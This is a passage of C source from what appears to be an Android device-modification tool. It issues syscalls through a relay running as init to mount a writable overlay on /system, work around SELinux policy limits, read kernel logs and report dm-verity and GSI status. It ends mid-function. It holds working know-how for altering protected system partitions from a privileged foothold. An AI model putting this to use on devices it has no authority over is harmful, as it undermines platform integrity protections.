    printf("overlay: creating dirs on scratch partition\n");
    if (overlay_mkdir_p(sock, part_dir, 0755) < 0) return 1;
    if (overlay_mkdir_p(sock, work_dir, 0755) < 0) return 1;
    if (overlay_mkdir_p(sock, upper_dir, 0755) < 0) return 1;

    /* ── Step 6: Check mount propagation state
     * FINDING.md section 9 item 8: "Init's root / is shared:1. Zygote and
     * app processes are master:1 (slave to init's peer group)."
     * We must check if the target mount is shared BEFORE changing it,
     * so we can restore shared state after the overlay mount. */
    int was_shared = overlay_is_shared(sock, partition);
    if (was_shared < 0) {
        /* Cannot determine propagation state — assume shared as the safe
         * default. If the target was actually private, restoring MS_SHARED
         * is harmless. If it was shared and we don't restore, apps won't
         * see the overlay (FINDING.md section 2.2 "Phase 6"). */
        fprintf(stderr, "overlay: cannot determine propagation state, assuming shared\n");
        was_shared = 1;
    }
    printf("overlay: %s propagation is %s\n", partition,
           was_shared ? "shared (will restore after mount)" : "private");

    /* ── Step 7: Make target MS_PRIVATE for safe overlay mount
     * FINDING.md section 2.2 "Phase 2": "Make /system MS_PRIVATE so overlay
     * mount doesn't propagate during setup"
     * mount(NULL, target, NULL, MS_PRIVATE | MS_REC, NULL) */
    printf("overlay: setting %s to private propagation\n", partition);
    OVLOG("step7: relay_mount_simple(%s, MS_PRIVATE|MS_REC=0x%lx)",
          partition, MS_PRIVATE | MS_REC);
    int64_t ret = relay_mount_simple(sock, partition, MS_PRIVATE | MS_REC);
    OVLOG("step7: ret=%lld", (long long)ret);
    if (ret < 0) {
        fprintf(stderr, "overlay: MS_PRIVATE on %s: %s\n",
                partition, errno_str((int)(-ret)));
        return 1;
    }

    /* ── Step 7b: Verify kernel supports overlayfs
     * Samsung's CheckOverlayfs() checks /proc/filesystems for "overlay".
     * Without this, mount() fails with ENODEV — a confusing error. */
    {
        uint8_t *fs_data = NULL;
        ssize_t fs_sz = relay_read_file(sock, "/proc/filesystems", &fs_data, 0);
        if (fs_sz <= 0 || !fs_data) {
            fprintf(stderr, "overlay: cannot read /proc/filesystems\n");
            if (was_shared)
                relay_mount_simple(sock, partition, MS_SHARED | MS_REC);
            return 1;
        }
        int has_overlay = 0;
        char *line = (char *)fs_data;
        char *end = (char *)fs_data + fs_sz;
        while (line < end) {
            char *nl = line;
            while (nl < end && *nl != '\n') nl++;
            /* each line is "nodev\toverlay\n" or "\text4\n" */
            char *tab = line;
            while (tab < nl && *tab != '\t') tab++;
            if (tab < nl) {
                tab++;
                size_t name_len = (size_t)(nl - tab);
                if (name_len == 7 && memcmp(tab, "overlay", 7) == 0)
                    has_overlay = 1;
            }
            line = (nl < end) ? nl + 1 : end;
        }
        free(fs_data);
        if (!has_overlay) {
            fprintf(stderr, "overlay: kernel does not support overlayfs\n");
            fprintf(stderr, "  CONFIG_OVERLAY_FS is not enabled in this kernel\n");
            if (was_shared)
                relay_mount_simple(sock, partition, MS_SHARED | MS_REC);
            return 1;
        }
    }

    /* ── Step 7c: Detect kernel version for userxattr support
     * Samsung's CheckOverlayfs() adds ",userxattr" only for kernel >= 5.15.
     * Older kernels (S22 = 4.x) reject unknown options with EINVAL. */
    int use_userxattr = 0;
    {
        uint8_t *ver_data = NULL;
        ssize_t ver_sz = relay_read_file(sock, "/proc/version", &ver_data, 512);
        if (ver_sz > 0 && ver_data) {
            int major = 0, minor = 0;
            /* format: "Linux version 5.15.189-..." */
            char *p = (char *)ver_data;
            char *pend = p + ver_sz;
            while (p < pend - 8) {
                if (memcmp(p, "version ", 8) == 0) {
                    p += 8;
                    while (p < pend && *p >= '0' && *p <= '9')
                        major = major * 10 + (*p++ - '0');
                    if (p < pend && *p == '.') p++;
                    while (p < pend && *p >= '0' && *p <= '9')
                        minor = minor * 10 + (*p++ - '0');
                    break;
                }
                p++;
            }
            free(ver_data);
            if (major > 5 || (major == 5 && minor >= 15))
                use_userxattr = 1;
            printf("overlay: kernel %d.%d detected%s\n",
                   major, minor, use_userxattr ? " (userxattr supported)" : "");
        } else {
            if (ver_data) free(ver_data);
            printf("overlay: WARNING — cannot read kernel version, skipping userxattr\n");
        }
    }

    /* ── Phase 3: Discover and evacuate submounts (AOSP mount.cpp:471-528)
     *
     * If the target partition has bind mounts (e.g., /system/carrier/<CODE>),
     * they become unreachable after overlay mount — they remain children of
     * the OLD mount (EROFS), hidden behind the overlay.  AOSP's solution:
     * MS_MOVE each submount to a temporary staging area, mount the overlay,
     * then MS_MOVE them back (making them children of the overlay mount).
     *
     * MS_MOVE is fd-safe: the kernel reuses the struct mount in place
     * (namespace.c:2503-2506).  Open file descriptors follow the mount.
     *
     * The staging area is /dev/.ovl_staging, bind-mounted to itself and
     * set to MS_PRIVATE (overlay_setup_staging).  This prevents MS_MOVE
     * operations from propagating through /dev's shared peer group. */
    submount_count = overlay_parse_submounts(sock, partition, submounts, MAX_SUBMOUNTS);
    if (submount_count < 0) {
        fprintf(stderr, "overlay: cannot parse mountinfo, aborting\n");
        if (was_shared)
            relay_mount_simple(sock, partition, MS_SHARED | MS_REC);
        return 1;
    }

    if (submount_count > 0) {
        printf("overlay: found %d submount(s) under %s — evacuating\n",
               submount_count, partition);

        if (overlay_setup_staging(sock) < 0) {
            fprintf(stderr, "overlay: staging area setup failed, aborting\n");
            if (was_shared)
                relay_mount_simple(sock, partition, MS_SHARED | MS_REC);
            return 1;
        }

        submount_moved_count = overlay_evacuate_submounts(
            sock, partition, submounts, submount_count);

        printf("overlay: %d/%d submount(s) evacuated\n",
               submount_moved_count, submount_count);
    } else {
        printf("overlay: no submounts under %s (clean target)\n", partition);
    }

    /* ── Step 8: Mount the overlay
     * FINDING.md section 2.1 step S6:
     *   mount("overlay", "/system", "overlay", MS_NOATIME,
     *     "lowerdir=/system,upperdir=/data/overlay/system/upper,"
     *     "workdir=/data/overlay/system/work[,userxattr]") */
    char options[1024];
    snprintf(options, sizeof(options),
             "lowerdir=%s,"
             "upperdir=%s,"
             "workdir=%s%s",
             partition, upper_dir, work_dir,
             use_userxattr ? ",userxattr" : "");

    OVLOG("step8: mount(\"overlay\", \"%s\", \"overlay\", 0x%lx, options)", partition, MS_NOATIME);
    OVLOG("step8: options[%zu]=\"%s\"", strlen(options), options);

    /* ── Pre-flight diagnostics: probe every EINVAL path from kernel
     * ovl_fill_super (super.c:2006-2212) so we report the EXACT failure
     * reason, since dmesg is inaccessible from the relay. */
    {
        /* Probe 1-3: do lowerdir, upperdir, workdir exist? */
        uint8_t sbuf[256];
        int64_t lr;
        lr = relay_fstatat(sock, partition, sbuf, sizeof(sbuf));
        OVLOG("probe: stat(%s) = %lld", partition, (long long)lr);
        lr = relay_fstatat(sock, upper_dir, sbuf, sizeof(sbuf));
        OVLOG("probe: stat(%s) = %lld", upper_dir, (long long)lr);
        lr = relay_fstatat(sock, work_dir, sbuf, sizeof(sbuf));
        OVLOG("probe: stat(%s) = %lld", work_dir, (long long)lr);

        /* Probe 4: is /data writable? (super.c:1233 __mnt_is_readonly) */
        char probe_file[512];
        snprintf(probe_file, sizeof(probe_file), "%s/.ovl_probe_%d",
                 base_dir, (int)getpid());
        int64_t pfd = relay_openat(sock, probe_file,
                                   MY_O_WRONLY | MY_O_CREAT | 0x200/*O_TRUNC*/, 0644);
        OVLOG("probe: create(%s) = %lld", probe_file, (long long)pfd);
        if (pfd >= 0) {
            relay_close(sock, pfd);
            relay_unlinkat(sock, probe_file, 0);
        }

        /* Probe 5: upper/work on same device? (super.c:1529 mnt comparison)
         * Use stat to compare st_dev */
        uint8_t *mi_data = NULL;
        ssize_t us = relay_read_file(sock, "/proc/1/mountinfo", &mi_data, 0);
        if (us > 0 && mi_data) {
            OVLOG("probe: mountinfo read ok (%zd bytes)", us);
            free(mi_data);
        }

        /* Probe 6 (RO overlay) REMOVED: creating a temporary mount point,
         * mounting an RO overlay, and tearing it down is ~30 lines of
         * dangerous code in PID 1 context for minimal diagnostic value.
         * The logcat logging of mount args + kmsg on failure is sufficient. */
    }

    printf("overlay: mounting overlay on %s\n", partition);
    ret = relay_mount(sock, "overlay", partition, "overlay", MS_NOATIME, options);
    OVLOG("step8: relay_mount ret=%lld (errno=%d if negative)", (long long)ret, ret < 0 ? (int)(-ret) : 0);
    if (ret < 0) {
        int err = (int)(-ret);
        fprintf(stderr, "overlay: mount failed on %s: %s\n",
                partition, errno_str(err));

        /* Read kernel log via relay — init CAN read /dev/kmsg even though
         * adb cannot. The kernel's overlayfs prints pr_err for every EINVAL
         * path, so the exact failure reason is in the last few kernel messages. */
        uint8_t *kmsg = NULL;
        ssize_t ksz = relay_read_file(sock, "/dev/kmsg", &kmsg, 8192);
        if (ksz > 0 && kmsg) {
            OVLOG("=== /dev/kmsg tail after failed mount ===");
            /* Print last ~10 lines containing "overlayfs" or "overlay" */
            char *p = (char *)kmsg;
            char *end_k = p + ksz;
            char *last_lines[20];
            int nlines = 0;
            while (p < end_k) {
                char *nl = p;
                while (nl < end_k && *nl != '\n') nl++;
                if (nl < end_k) *nl = '\0';
                if (strstr(p, "overlay") || strstr(p, "ovl_") || strstr(p, "mount")) {
                    if (nlines < 20) last_lines[nlines++] = p;
                }
                p = (nl < end_k) ? nl + 1 : end_k;
            }
            for (int ki = 0; ki < nlines; ki++) {
                OVLOG("kmsg: %s", last_lines[ki]);
                printf("  kmsg: %s\n", last_lines[ki]);
            }
            if (nlines == 0) {
                OVLOG("kmsg: no overlay/mount messages found in last %zd bytes", ksz);
                printf("  kmsg: no overlay/mount messages found\n");
            }
            free(kmsg);
        } else {
            OVLOG("kmsg: cannot read /dev/kmsg (ret=%zd)", ksz);
            /* Fallback: try /proc/kmsg */
            uint8_t *pkmsg = NULL;
            ssize_t pksz = relay_read_file(sock, "/proc/kmsg", &pkmsg, 8192);
            if (pksz > 0 && pkmsg) {
                pkmsg[pksz] = '\0';
                OVLOG("proc/kmsg[%zd]: %s", pksz, (char *)pkmsg);
                printf("  /proc/kmsg: %s\n", (char *)pkmsg);
                free(pkmsg);
            }
        }

        if (err == 16) { /* EBUSY */
            fprintf(stderr, "  target may have an existing overlay or active submounts\n");
        } else if (err == 22) { /* EINVAL */
            fprintf(stderr, "  check: upperdir and workdir must be on same filesystem\n");
            fprintf(stderr, "  check: workdir must be empty (rm -rf %s/*)\n", work_dir);
        }
        /* Restore submounts BEFORE restoring propagation — submounts must
         * go back to their original locations even if overlay mount failed.
         * This is the safety guarantee (AOSP mount.cpp:533-541). */
        if (submount_moved_count > 0) {
            printf("overlay: restoring %d submount(s) after mount failure\n",
                   submount_moved_count);
            overlay_restore_submounts(sock, submounts, submount_count);
        }
        /* Clean up staging even if no submounts were moved — the staging
         * area was set up whenever submount_count > 0 (staging setup runs
         * before evacuation), so we must tear it down on all exit paths. */
        if (submount_count > 0) {
            overlay_cleanup_staging(sock);
        }
        /* Restore shared propagation.  Use "/" with MS_REC because after
         * overlay mount failure, the partition's mount type may have changed
         * in unpredictable ways.  "/" is rootfs:dir — init has mounton. */
        if (was_shared) {
            relay_mount_simple(sock, "/", MS_SHARED | MS_REC);
        }
        return 1;
    }

    /* ── Phase 5: Restore evacuated submounts (AOSP mount.cpp:533-541)
     *
     * Move submounts back from staging to their original locations.
     * After the overlay mount succeeded, these paths now resolve through
     * the overlay — the submounts become children of the OVERLAY mount
     * instead of the old EROFS mount.  This is how AOSP ensures submount
     * content remains accessible through the overlay. */
    if (submount_moved_count > 0) {
        printf("overlay: restoring %d submount(s)\n", submount_moved_count);
        int restore_fails = overlay_restore_submounts(sock, submounts, submount_count);
        if (restore_fails > 0) {
            fprintf(stderr, "overlay: WARNING — %d submount(s) failed to restore\n",
                    restore_fails);
            fprintf(stderr, "  affected paths may show empty directories until reboot\n");
        }
    }
    if (submount_count > 0) {
        overlay_cleanup_staging(sock);
    }

    /* ── Step 9: Restore shared propagation if it was shared
     *
     * Samsung's SELinux policy lacks mounton on overlayfs_file:dir for init,
     * so we cannot apply MS_SHARED directly to the overlay mount root
     * (which now has type unlabeled or overlayfs_file).
     *
     * Workaround: apply MS_SHARED|MS_REC to "/" instead.  This checks
     * mounton on rootfs:dir (GRANTED) and recursively makes ALL mounts
     * under "/" shared, including the overlay mount at the target partition.
     * do_change_type (namespace.c:2642) requires path->dentry == mnt_root,
     * which "/" satisfies.
     *
     * NOTE: Post-boot overlay propagation is inherently limited.  Making
     * the mount private (Step 7) disconnects existing slave namespaces
     * (do_make_slave, pnode.c:88-95 clears mnt_master for all slaves).
     * Restoring MS_SHARED creates a NEW peer group that existing zygote/app
     * namespaces are NOT slaves of.  Full visibility requires a soft reboot
     * (crash system_server → zygote restarts with fresh mount namespace). */
    if (was_shared) {
        printf("overlay: restoring shared propagation\n");
        ret = relay_mount_simple(sock, "/", MS_SHARED | MS_REC);
        if (ret < 0) {
            fprintf(stderr, "overlay: WARNING — failed to restore MS_SHARED: %s\n",
                    errno_str((int)(-ret)));
            fprintf(stderr, "  a soft reboot will make the overlay visible to apps\n");
        }
    }

    /* ── Step 8b: Relabel overlay root to overlayfs_file
     *
     * MUST happen AFTER Step 9 (MS_SHARED restore), because the relabel
     * changes the overlay root's SELinux type from unlabeled to
     * overlayfs_file.  Samsung's policy lacks mounton on overlayfs_file
     * for init — if we relabeled first, the MS_SHARED call would be
     * denied by SELinux (FILE__MOUNTON check in selinux_mount,
     * hooks.c:2839-2852).
     *
     * The kernel assigns unlabeled:s0 to the overlay root because the
     * upper dir has no security.selinux xattr and sbsec->def_sid=0
     * (hooks.c:L1428 → SECINITSID_UNLABELED).  We set overlayfs_file
     * here as a best-practice label for overlay infrastructure. */
    printf("overlay: relabeling overlay root to overlayfs_file\n");
    int label_ret = chcon_one(sock, partition, "u:object_r:overlayfs_file:s0");
    if (label_ret < 0) {
        fprintf(stderr, "overlay: WARNING — failed to relabel overlay root\n");
        fprintf(stderr, "  overlay may not be visible to kernel/apps\n");
    }
    OVLOG("step8b: chcon_one(%s, overlayfs_file) ret=%d", partition, label_ret);

    /* Also set xattr on the upper dir directly, so next mount inherits it */
    chcon_one(sock, upper_dir, "u:object_r:overlayfs_file:s0");
    OVLOG("step8b: chcon_one(%s, overlayfs_file) upper dir", upper_dir);

    /* ── Step 10: Verify success by reading /proc/mounts
     * Confirm the overlay actually appears in the mount table */
    int verify = overlay_check_mounted(sock, partition);
    if (verify == 1) {
        printf("\noverlay: SUCCESS — %s is now overlaid (RW)\n", partition);
        printf("  upper: %s\n", upper_dir);
        printf("  work:  %s\n", work_dir);
        printf("  lower: %s\n", partition);
        printf("\n  Writes to %s land in %s and persist across reboots.\n",
               partition, upper_dir);
        printf("  Re-run 'overlay setup %s' after reboot to re-activate.\n", partition);
        return 0;
    } else {
        fprintf(stderr, "overlay: mount() returned success but overlay not in /proc/mounts\n");
        fprintf(stderr, "  this should not happen — check dmesg for kernel errors\n");
        return 1;
    }

    /* No restore_fscreate label needed — fscreate is never set in this
     * function. The scratch filesystem is unlabeled, and we don't set
     * fscreate before creating dirs on it. */
}

/* overlay_teardown — unmount an overlay from a partition.
 *
 * Uses SYS_umount2(target, 0) to cleanly unmount the overlay.
 * Unlike cmd_umount, this does NOT block unmounting /system — that's the
 * entire point of overlay teardown (FINDING.md section 2). */
static int overlay_teardown(int sock, const char *partition) {
    /* Verify overlay is actually mounted before trying to unmount */
    int mounted = overlay_check_mounted(sock, partition);
    if (mounted < 0) {
        fprintf(stderr, "overlay: cannot read /proc/mounts\n");
        return 1;
    }
    if (!mounted) {
        fprintf(stderr, "overlay: no overlay mounted on %s\n", partition);
        return 1;
    }

    /* umount2(target, 0): x0=target(data), x1=flags(0)
     * Pattern from cmd_umount — direct send_syscall with FLAG_X0_DATA */
    size_t plen = strlen(partition) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, partition, plen);

    printf("overlay: unmounting overlay from %s\n", partition);
    int64_t ret = send_syscall(sock, SYS_umount2,
                               0, 0, 0, 0, 0, 0,
                               FLAG_X0_DATA,
                               dbuf, plen,
                               NULL, 0);
    if (ret < 0) {
        int err = (int)(-ret);
        fprintf(stderr, "overlay: umount %s: %s\n", partition, errno_str(err));
        if (err == 16) { /* EBUSY */
            fprintf(stderr, "  processes may have open files on the overlay\n");
            fprintf(stderr, "  close all files on %s, then retry\n", partition);
        }
        return 1;
    }

    /* Verify teardown succeeded */
    int verify = overlay_check_mounted(sock, partition);
    if (verify == 0) {
        printf("overlay: %s overlay unmounted successfully\n", partition);
        printf("  upper/work dirs remain at /data/overlay/ (not deleted)\n");

        /* Tear down scratch partition if no other overlays still use it.
         * overlay_check_mounted with NULL-ish target would need a new API,
         * so we check /proc/mounts for ANY remaining overlay mount whose
         * upperdir points into SCRATCH_MNT. */
        {
            uint8_t *mdata = NULL;
            ssize_t msz = relay_read_file(sock, "/proc/mounts", &mdata, 0);
            int scratch_in_use = 0;
            if (msz > 0 && mdata) {
                mdata[msz] = '\0';
                /* Any remaining overlay mount referencing /dev/.overlay means
                 * the scratch partition is still needed */
                if (strstr((char *)mdata, SCRATCH_MNT) != NULL)
                    scratch_in_use = 1;
                free(mdata);
            }
            if (!scratch_in_use) {
                OVLOG("teardown: no overlays use scratch, tearing down");
                overlay_teardown_scratch(sock);
            } else {
                OVLOG("teardown: other overlays still use scratch, keeping mounted");
            }
        }
        return 0;
    } else {
        fprintf(stderr, "overlay: umount returned success but overlay still in /proc/mounts\n");
        return 1;
    }
}

/* cmd_overlay — top-level overlay command dispatcher.
 *
 * Subcommands:
 *   overlay setup [/system]     — mount persistent RW overlay
 *   overlay status              — show all overlay mounts with details
 *   overlay teardown [/system]  — unmount overlay */
static int cmd_overlay(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr,
            "overlay: OverlayFS setup/status/teardown\n"
            "Usage:\n"
            "  overlay setup [partition]     Mount RW overlay (default: /system)\n"
            "  overlay status               Show all overlay mounts\n"
            "  overlay teardown [partition]  Unmount overlay (default: /system)\n"
            "\n"
            "Examples:\n"
            "  overlay setup                Mount overlay on /system\n"
            "  overlay setup /vendor         Mount overlay on /vendor\n"
            "  overlay status               Show overlay details\n"
            "  overlay teardown /system     Remove /system overlay\n");
        return 1;
    }

    const char *subcmd = argv[1];

    if (strcmp(subcmd, "setup") == 0) {
        /* Default partition is /system (FINDING.md section 1:
         * "Mount a persistent read-write OverlayFS on /system") */
        const char *partition = (argc >= 3) ? argv[2] : "/system";

        /* Validate partition path starts with "/" */
        if (partition[0] != '/') {
            fprintf(stderr, "overlay: partition must be an absolute path (got '%s')\n",
                    partition);
            fprintf(stderr, "  example: overlay setup /system\n");
            return 1;
        }
        return overlay_setup(sock, partition);

    } else if (strcmp(subcmd, "status") == 0) {
        return overlay_print_status(sock);

    } else if (strcmp(subcmd, "teardown") == 0) {
        /* Default partition is /system, matching setup default */
        const char *partition = (argc >= 3) ? argv[2] : "/system";
        if (partition[0] != '/') {
            fprintf(stderr, "overlay: partition must be an absolute path (got '%s')\n",
                    partition);
            return 1;
        }
        return overlay_teardown(sock, partition);

    } else {
        fprintf(stderr, "overlay: unknown subcommand '%s'\n", subcmd);
        fprintf(stderr, "  valid subcommands: setup, status, teardown\n");
        return 1;
    }
}

/* ── verity: check dm-verity status via sysfs ───────────────────────────── */
static int cmd_verity(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;

    /* Check dm-verity targets */
    int64_t dfd = relay_openat(sock, "/sys/block", MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (dfd < 0) {
        fprintf(stderr, "verity: cannot open /sys/block\n");
        return 1;
    }

    uint8_t dents[DATA_SIZE];
    int found = 0;
    for (;;) {
        int64_t n = relay_getdents64(sock, dfd, dents, DATA_SIZE);
        if (n <= 0) break;
        uint8_t *pos = dents;
        while (pos < dents + n) {
            uint16_t reclen = unpack_u32(pos + 16) & 0xFFFF;
            if (reclen == 0) break;
            char *dname = (char *)(pos + 19);

            if (strncmp(dname, "dm-", 3) == 0) {
                /* Check if this is a verity device */
                char uuidpath[256];
                snprintf(uuidpath, sizeof(uuidpath), "/sys/block/%s/dm/uuid", dname);
                uint8_t *uuiddata = NULL;
                ssize_t usz = relay_read_file(sock, uuidpath, &uuiddata, 4096);
                int is_verity = 0;
                char dm_uuid[128] = "";
                if (usz > 0 && uuiddata) {
                    uuiddata[usz] = '\0';
                    char *nl = strchr((char *)uuiddata, '\n');
                    if (nl) *nl = '\0';
                    strncpy(dm_uuid, (char *)uuiddata, sizeof(dm_uuid) - 1);
                    if (strstr(dm_uuid, "verity") != NULL) is_verity = 1;
                }
                free(uuiddata);

                if (!is_verity) {
                    pos += reclen;
                    continue;
                }

                /* Read name */
                char namepath[256];
                snprintf(namepath, sizeof(namepath), "/sys/block/%s/dm/name", dname);
                uint8_t *namedata = NULL;
                ssize_t nsz = relay_read_file(sock, namepath, &namedata, 4096);
                char dm_name[128] = "(unknown)";
                if (nsz > 0 && namedata) {
                    namedata[nsz] = '\0';
                    char *nl = strchr((char *)namedata, '\n');
                    if (nl) *nl = '\0';
                    strncpy(dm_name, (char *)namedata, sizeof(dm_name) - 1);
                }
                free(namedata);

                /* Read suspended */
                char susppath[256];
                snprintf(susppath, sizeof(susppath), "/sys/block/%s/dm/suspended", dname);
                uint8_t *suspdata = NULL;
                ssize_t susz = relay_read_file(sock, susppath, &suspdata, 64);
                const char *status = "active";
                if (susz > 0 && suspdata && suspdata[0] == '1') status = "SUSPENDED";
                free(suspdata);

                printf("%-12s %-30s uuid=%-40s [%s]\n",
                       dname, dm_name, dm_uuid, status);
                found++;
            }
            pos += reclen;
        }
    }
    relay_close(sock, dfd);

    if (!found) printf("No dm-verity devices found\n");

    /* Also show verity state from cmdline */
    uint8_t *cmdline = NULL;
    ssize_t csz = relay_read_file(sock, "/proc/cmdline", &cmdline, 0);
    if (csz > 0 && cmdline) {
        cmdline[csz] = '\0';
        const char *keys[] = {"androidboot.veritymode", "androidboot.verifiedbootstate", NULL};
        for (int k = 0; keys[k]; k++) {
            char *p = strstr((char *)cmdline, keys[k]);
            if (p) {
                char param[128] = {0};
                int j = 0;
                while (*p && *p != ' ' && *p != '\n' && j < 127) param[j++] = *p++;
                printf("%s\n", param);
            }
        }
    }
    free(cmdline);

    return 0;
}

/* ── partitions: list from /proc/partitions ─────────────────────────────── */
static int cmd_partitions(int sock, int argc, char *argv[]) {
    const char *filter = NULL;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            printf("partitions [filter]\n"
                   "  Show /proc/partitions, optionally filtered\n");
            return 0;
        } else {
            filter = argv[i];
        }
    }

    uint8_t *data = NULL;
    ssize_t sz = relay_read_file(sock, "/proc/partitions", &data, 0);
    if (sz <= 0 || !data) {
        fprintf(stderr, "partitions: cannot read /proc/partitions\n");
        free(data);
        return 1;
    }
    data[sz] = '\0';

    char *line = (char *)data;
    int lineno = 0;
    while (*line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';
        lineno++;
        /* Always print header lines (1-2) */
        if (lineno <= 2 || filter == NULL || strstr(line, filter) != NULL) {
            if (line[0] != '\0') printf("%s\n", line);
        }
        if (!nl) break;
        line = nl + 1;
    }

    free(data);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Task 3: GSI (DSU) and device-mapper status commands
 * ═══════════════════════════════════════════════════════════════════════════ */

/* ── gsi: check GSI/DSU state ───────────────────────────────────────────── */
static int cmd_gsi(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;

    printf("═══ GSI / Dynamic System Update (DSU) Status ═══\n\n");

    /* 1. Check if GSI is installed */
    const char *gsi_marker_files[] = {
        "/metadata/gsi/dsu/booted",
        "/metadata/gsi/dsu/lp_metadata",
        "/metadata/gsi/dsu/metadata.img",
        "/metadata/gsi/dsu/dsu_install_done",
        NULL
    };

    printf("── GSI markers (/metadata/gsi/dsu/) ──\n");
    int gsi_installed = 0;
    for (int i = 0; gsi_marker_files[i]; i++) {
        uint8_t statbuf[128];
        int64_t sr = relay_fstatat(sock, gsi_marker_files[i], statbuf, sizeof(statbuf));
        if (sr >= 0) {
            uint64_t size = unpack_u64(statbuf + 48);
            printf("  [EXISTS] %s (%llu bytes)\n",
                   gsi_marker_files[i], (unsigned long long)size);
            gsi_installed = 1;
        } else {
            printf("  [ABSENT] %s\n", gsi_marker_files[i]);
        }
    }

    /* 2. List /metadata/gsi/dsu/ contents if it exists */
    {
        int64_t dfd = relay_openat(sock, "/metadata/gsi/dsu",
                                   MY_O_RDONLY | MY_O_DIRECTORY, 0);
        if (dfd >= 0) {
            printf("\n── /metadata/gsi/dsu/ contents ──\n");
            uint8_t dents[DATA_SIZE];
            for (;;) {
                int64_t n = relay_getdents64(sock, dfd, dents, DATA_SIZE);
                if (n <= 0) break;
                uint8_t *pos = dents;
                while (pos < dents + n) {
                    uint16_t reclen = unpack_u32(pos + 16) & 0xFFFF;
                    if (reclen == 0) break;
                    char *name = (char *)(pos + 19);
                    if (strcmp(name, ".") != 0 && strcmp(name, "..") != 0) {
                        char fullpath[512];
                        snprintf(fullpath, sizeof(fullpath), "/metadata/gsi/dsu/%s", name);
                        uint8_t sb[128];
                        int64_t ss = relay_fstatat(sock, fullpath, sb, sizeof(sb));
                        if (ss >= 0) {
                            uint64_t sz = unpack_u64(sb + 48);
                            printf("  %-40s %llu bytes\n", name, (unsigned long long)sz);
                        } else {
                            printf("  %s\n", name);
                        }
                    }
                    pos += reclen;
                }
            }
            relay_close(sock, dfd);
        }
    }

    /* 3. Check /data/gsi/ */
    {
        int64_t dfd = relay_openat(sock, "/data/gsi",
                                   MY_O_RDONLY | MY_O_DIRECTORY, 0);
        if (dfd >= 0) {
            printf("\n── /data/gsi/ contents ──\n");
            uint8_t dents[DATA_SIZE];
            for (;;) {
                int64_t n = relay_getdents64(sock, dfd, dents, DATA_SIZE);
                if (n <= 0) break;
                uint8_t *pos = dents;
                while (pos < dents + n) {
                    uint16_t reclen = unpack_u32(pos + 16) & 0xFFFF;
                    if (reclen == 0) break;
                    char *name = (char *)(pos + 19);
                    if (strcmp(name, ".") != 0 && strcmp(name, "..") != 0) {
                        printf("  %s\n", name);
                    }
                    pos += reclen;
                }
            }
            relay_close(sock, dfd);
        } else {
            printf("\n/data/gsi/: not present\n");
        }
    }

    /* 4. Slot suffix from cmdline */
    uint8_t *cmdline = NULL;
    ssize_t csz = relay_read_file(sock, "/proc/cmdline", &cmdline, 0);
    if (csz > 0 && cmdline) {
        cmdline[csz] = '\0';
        printf("\n── Boot slot info ──\n");

        const char *keys[] = {
            "androidboot.slot_suffix=",
            "androidboot.slot=",
            "androidboot.boot_devices=",
            "androidboot.force_normal_boot=",
            NULL
        };
        for (int k = 0; keys[k]; k++) {
            char *p = strstr((char *)cmdline, keys[k]);
            if (p) {
                char param[256] = {0};
                int j = 0;
                while (*p && *p != ' ' && *p != '\n' && j < 255) param[j++] = *p++;
                printf("  %s\n", param);
            }
        }
    }
    free(cmdline);

    printf("\n── Summary ──\n");
    printf("GSI installed: %s\n", gsi_installed ? "YES" : "NO");

    return 0;
}

/* ── dm: device-mapper status (Task 3 alias/variant of dmsetup) ─────────── */
static int cmd_dm(int sock, int argc, char *argv[]) {
    const char *subcmd = NULL;
    const char *name_filter = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            printf("dm [list|status|table|info] [name]\n"
                   "  list      list all dm devices (default)\n"
                   "  status    show status of all/named dm device(s)\n"
                   "  table     show dm target types\n"
                   "  info      detailed info for named device\n"
                   "  <name>    filter by device name\n");
            return 0;
        } else if (!subcmd && (strcmp(argv[i], "list") == 0 ||
                               strcmp(argv[i], "status") == 0 ||
                               strcmp(argv[i], "table") == 0 ||
                               strcmp(argv[i], "info") == 0)) {
            subcmd = argv[i];
        } else {
            name_filter = argv[i];
        }
    }
    if (!subcmd) subcmd = "list";

    int64_t dfd = relay_openat(sock, "/sys/block", MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (dfd < 0) {
        fprintf(stderr, "dm: cannot open /sys/block: %s\n", errno_str((int)-dfd));
        return 1;
    }

    uint8_t dents[DATA_SIZE];
    int found = 0;
    for (;;) {
        int64_t n = relay_getdents64(sock, dfd, dents, DATA_SIZE);
        if (n <= 0) break;
        uint8_t *pos = dents;
        while (pos < dents + n) {
            uint16_t reclen = unpack_u32(pos + 16) & 0xFFFF;
            if (reclen == 0) break;
            char *dname = (char *)(pos + 19);

            if (strncmp(dname, "dm-", 3) != 0) {
                pos += reclen;
                continue;
            }

            /* Read dm/name */
            char namepath[256];
            snprintf(namepath, sizeof(namepath), "/sys/block/%s/dm/name", dname);
            uint8_t *namedata = NULL;
            ssize_t nsz = relay_read_file(sock, namepath, &namedata, 4096);
            char dm_name[128] = "(unknown)";
            if (nsz > 0 && namedata) {
                namedata[nsz] = '\0';
                char *nl = strchr((char *)namedata, '\n');
                if (nl) *nl = '\0';
                strncpy(dm_name, (char *)namedata, sizeof(dm_name) - 1);
            }
            free(namedata);

            /* Apply name filter */
            if (name_filter && strstr(dm_name, name_filter) == NULL
                            && strstr(dname, name_filter) == NULL) {
                pos += reclen;
                continue;
            }

            /* Read common fields */
            char uuidpath[256];
            snprintf(uuidpath, sizeof(uuidpath), "/sys/block/%s/dm/uuid", dname);
            uint8_t *uuiddata = NULL;
            ssize_t usz = relay_read_file(sock, uuidpath, &uuiddata, 4096);
            char dm_uuid[128] = "";
            if (usz > 0 && uuiddata) {
                uuiddata[usz] = '\0';
                char *nl = strchr((char *)uuiddata, '\n');
                if (nl) *nl = '\0';
                strncpy(dm_uuid, (char *)uuiddata, sizeof(dm_uuid) - 1);
            }
            free(uuiddata);

            char sizepath[256];
